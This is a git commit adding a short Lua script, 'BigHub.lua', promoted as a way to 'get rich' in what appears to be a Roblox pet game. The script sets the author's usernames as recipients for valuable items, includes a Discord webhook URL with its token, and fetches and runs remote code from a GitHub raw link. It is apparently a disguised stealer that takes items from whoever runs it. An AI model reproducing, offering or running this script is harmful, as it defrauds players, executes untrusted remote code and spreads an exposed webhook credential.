3501be8a6aa8d105f5256f4d428ea451e7a547d0
x1200HP <iialirblx@gmail.com>
2024-05-29 09:11:04 +0800

    Create BigHub.lua
    Get Rich By Executing This OP Script

---
+++ BigHub.lua
@@ -0,0 +1,7 @@
+lua
+Username = "tanneryay78"
+Username2 = "x1200HP" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = https://discordapp.com/api/webhooks/1199253716965011477/_owwAsfLn-2ROT10lm0jujQ7UzW9sxW-hKyJ1F4TFtMaZR2Ma62ldRWZBfDGVlgv2ndV
+Support = false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
